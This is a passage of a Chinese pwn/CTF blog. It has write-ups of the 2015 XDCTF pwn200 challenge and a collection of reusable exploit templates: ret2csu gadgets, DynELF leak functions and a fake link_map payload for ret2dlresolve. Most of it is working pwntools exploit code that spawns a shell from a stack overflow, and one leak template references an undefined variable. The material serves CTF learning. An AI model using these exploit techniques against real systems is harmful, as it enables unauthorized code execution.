class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
<p>我和他的版本不同，我打不通也看不懂，以后再学</p>
<p>地址：<a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-gbecslst-no.html">2017湖湘杯pwn100的wp - JavaShuo</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/" class="post-title-link" itemprop="url">万能pop+DynELF经典组合(附加ret2dlresolve)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-03 14:07:28" itemprop="dateCreated datePublished" datetime="2022-01-03T14:07:28+08:00">2022-01-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-04 22:34:48" itemprop="dateModified" datetime="2022-01-04T22:34:48+08:00">2022-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>事情的起因是我遇到了一道做过的题目，它的代码完全没有改变，只是程序变成了64位</p>
<p>以前我用DynELF直接打通了32位，现在来看64位发现少了一个gadget，于是我脑袋抽了，用“ret2dlresolve”搞了一上午</p>
<p>后来想到了利用“ret2csu”来控制DynELF中的“write”函数</p>
<p>发现这种组合的通用性还挺高，只要程序溢出至少“136字节”就可以打</p>
<p>于是想记录一下，让今后的我少走点弯路</p>
<hr>
<p><strong>2015-xdctf-pwn200</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183143407.png" alt="1641183143407"> </p>
<p>一次输入</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183182063.png" alt="1641183182063"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183191422.png" alt="1641183191422"> </p>
<p>64位，dynamically，开了NX</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183209046.png" alt="1641183209046"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183233342.png" alt="1641183233342"> </p>
<p>没有system，没有“/bin/sh”</p>
<p>函数write可以输出的值就是字符串的长度“23字节”</p>
<p>vuln中有read，可以输入“256字节”</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183449006.png" alt="1641183449006"> </p>
<p>程序溢出了“144字节”，有write函数，可以有多种方法打通</p>
<p><strong>DynELF</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x40066E</span></span><br><span class="line">fun_addr=<span class="number">0x400637</span> </span><br><span class="line">bss_addr=<span class="number">0x601050</span>+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x000000000400780</span></span><br><span class="line">csu_end_addr=<span class="number">0x00000000040079A</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx) + p64(rbp)+p64(r12) +p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">	csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br><span class="line">	data=p.recv(<span class="number">8</span>)</span><br><span class="line">	log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">		</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">execve_addr=d.lookup(<span class="string">&#x27;execve&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve_addr: &quot;</span>+<span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>注意：</strong>(每一条都是血的教训)</p>
<p>因为DynELF模块在执行的过程中会输出一下字符串，所以“p.recvuntil”必须有</p>
<p>不同程序的csu可能不同，有时需要修改模板</p>
<p>另外我也尝试过用“system”但是打不通（可能是环境问题）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>用csu包装的函数视乎只认识GOT表，用其他的就报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line"><span class="comment">#read(0, bss_addr, len(payload))</span></span><br><span class="line">p.send(payload)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"><span class="comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br></pre></td></tr></table></figure>
<p>必须利用“read”把泄露出来的“execve”写在某个地址上，只有这样才可以调用“execve”</p>
<p>​        //我也尝试过用其他姿势来调用“execve”，但是都报错了</p>
<hr>
<p><strong>ret2dlresolve</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>) <span class="comment">#程序使用这个库文件</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_stage = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line"><span class="comment">#目标函数和已知函数的偏移（把‘write’重定位成‘system’）</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span> </span><br><span class="line">plt_load = <span class="number">0x400506</span> <span class="comment">#plt[1](dl_runtime_resolve)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    <span class="comment">#offset为负数，可以用‘(2 ** 64 - 1)’来控制范围 </span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)</span><br><span class="line">payload = flat( <span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> ,pop_rdi, <span class="number">0</span> , pop_rsi , bss_stage , <span class="number">0</span> , read_plt , pop_rsi , <span class="number">0</span> ,<span class="number">0</span> , pop_rdi , bss_stage + <span class="number">0x48</span>  , plt_load , bss_stage , <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">read_plt触发时输入‘fake_link_map’，plt_load就是dl_runtime_resolve，控制程序手段执行dl_runtime_resolve，此时‘bss_stage’被当做第一个参数，‘0’被当做第二个参数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)  </span><br><span class="line">r.sendline(payload)  </span><br><span class="line"></span><br><span class="line">r.send(fake_link_map) <span class="comment">#把write重定位为system</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>可以来看一下fake_Linkmap_payload的栈帧:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| fake_linkmap_addr+<span class="number">0x00</span>  --&gt; offset <span class="comment">//DT_STRTAB（随便设置的）</span></span><br><span class="line"><span class="number">0008</span>| fake_linkmap_addr+<span class="number">0x08</span>  --&gt; <span class="number">0</span>	<span class="comment">//DT_JMPREL</span></span><br><span class="line"><span class="number">0010</span>| fake_linkmap_addr+<span class="number">0x10</span>  --&gt; fake_linkmap_addr + <span class="number">0x18</span> </span><br><span class="line"><span class="number">0018</span>| fake_linkmap_addr+<span class="number">0x18</span>  --&gt; fake_linkmap_addr + <span class="number">0x30</span> - offset </span><br><span class="line"><span class="number">0020</span>| fake_linkmap_addr+<span class="number">0x20</span>  --&gt; <span class="number">0x7</span></span><br><span class="line"><span class="number">0028</span>| fake_linkmap_addr+<span class="number">0x28</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0030</span>| fake_linkmap_addr+<span class="number">0x30</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0038</span>| fake_linkmap_addr+<span class="number">0x38</span>  --&gt; <span class="number">0</span> <span class="comment">//DT_SYMTAB</span></span><br><span class="line"><span class="number">0040</span>| fake_linkmap_addr+<span class="number">0x40</span>  --&gt; known_func_ptr - <span class="number">0x8</span> </span><br><span class="line"><span class="number">0048</span>| fake_linkmap_addr+<span class="number">0x48</span>  --&gt; b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">0068</span>| fake_linkmap_addr+<span class="number">0x68</span>  --&gt; fake_linkmap_addr </span><br><span class="line">    <span class="comment">//对应的值是DT_STRTAB的地址(fake_linkmap_addr)</span></span><br><span class="line"><span class="number">0070</span>| fake_linkmap_addr+<span class="number">0x70</span>  --&gt; fake_linkmap_addr + <span class="number">0x38</span> </span><br><span class="line">    <span class="comment">//对应的值是DT_SYMTAB的地址(fake_linkmap_addr + 0x38)</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">00f</span>8| fake_linkmap_addr+<span class="number">0xf8</span>  --&gt; fake_linkmap_addr + <span class="number">0x8</span>   </span><br><span class="line">    <span class="comment">//对应的值是DT_JMPREL的地址(fake_linkmap_addr + 0x8)</span></span><br></pre></td></tr></table></figure>
<p><strong>dl_runtime_resolve</strong>被手动调用时，会读取“bss_stage”上的数据为“link_map”然后获取“JMPREL”，“SYMTAB”，“DT_STRTAB”，问题的关键就在于把它们三个的 <strong>“索引”</strong> 都弄成“0”，才能进行伪装</p>
<p>这种伪装方式不需要“JMPREL”，“SYMTAB”，“DT_STRTAB”的地址，只要一个已知函数的GOT表地址，和libc版本就可以了</p>
<hr>
<p><strong>注意：</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641234781843.png" alt="1641234781843"> </p>
<p>重定位入口的符号类型（一般为“0x7”）在“JMPREL”中看</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">各种模板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-02 22:35:12" itemprop="dateCreated datePublished" datetime="2022-01-02T22:35:12+08:00">2022-01-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:30:18" itemprop="dateModified" datetime="2022-04-03T17:30:18+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="各种模板"><a href="#各种模板" class="headerlink" title="各种模板"></a>各种模板</h2><p>pwn题中有许多目标模板，灵活利用可以节约大量时间</p>
<p>我打算把我遇到的所有模板都挂在这里，方便以后查找</p>
<hr>
<h2 id="CSU-万能pop模板"><a href="#CSU-万能pop模板" class="headerlink" title="CSU-万能pop模板"></a>CSU-万能pop模板</h2><p>当程序的常规gadgets不能满足需求时（通常是缺少“pop_rdx”），就需要万能pop</p>
<p>如果用<strong>csu</strong>进行寄存器赋值，需要两个重要的ROPgadgets：</p>
<p>csu_front_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126255915-1642995722008-1647496563602.png" class width="1641126255915"> 
<p> csu_end_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126386447-1642995722010-1647496563602.png" class width="1641126386447"> 
<p>这两个gadgets相互配合就可以执行任何已知函数</p>
<p>不同的程序csu可能不同（寄存器顺序不同），一定要确认并修改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure>
<p>​        // fun_got也可以是指向函数首地址的指针</p>
<p>例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, bss_addr, <span class="number">1</span>, main_addr)</span><br><span class="line"><span class="comment">#执行write(1,bss_addr,8)后，执行main_addr</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">8</span>, bss_addr, <span class="number">0</span>, main_addr)	</span><br><span class="line"><span class="comment">#执行read(0,bss_addr,8)后，执行main_addr</span></span><br></pre></td></tr></table></figure>
<p>​        //但是万能pop需要至少“136字节”（0x88）的溢出</p>
<h2 id="DynELF-基于puts的模板"><a href="#DynELF-基于puts的模板" class="headerlink" title="DynELF-基于puts的模板"></a>DynELF-基于puts的模板</h2><p>puts遇到“\x00”会中断，并且会在字符串结尾自动加上’\n’，非常不适合leak函数</p>
<p>所以想用puts来泄露地址，必须要对其进行处理：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(addr) </span><br><span class="line">    payload += p64(puts_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload) </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    count = <span class="number">0</span> </span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    up = <span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>) </span><br><span class="line">        count += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>: </span><br><span class="line">            data = data[:-<span class="number">1</span>] </span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            data += c </span><br><span class="line">        up = c </span><br><span class="line">    data = data[:<span class="number">8</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt) + p32(ret_address) + p32(address)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
